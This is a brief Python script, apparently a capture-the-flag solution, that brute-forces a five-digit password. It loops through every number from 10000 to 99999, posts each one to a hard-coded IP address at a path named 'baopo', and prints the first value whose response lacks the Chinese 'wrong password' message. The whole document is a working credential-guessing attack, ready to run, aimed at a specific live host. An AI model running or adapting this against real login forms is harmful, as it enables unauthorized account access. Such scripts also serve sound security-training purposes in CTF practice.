import requests

def main():
    for i in range(10000, 100000):
        url = "http://120.24.86.145:8002/baopo/?yes"
        data = {'pwd': str(i)}
        r = requests.post(url, data=data)
        r.encoding = r.apparent_encoding
        if '密码不正确，请重新输入' not in r.text:
            print(r.text)
            print(str(i))
            exit(0)
main()
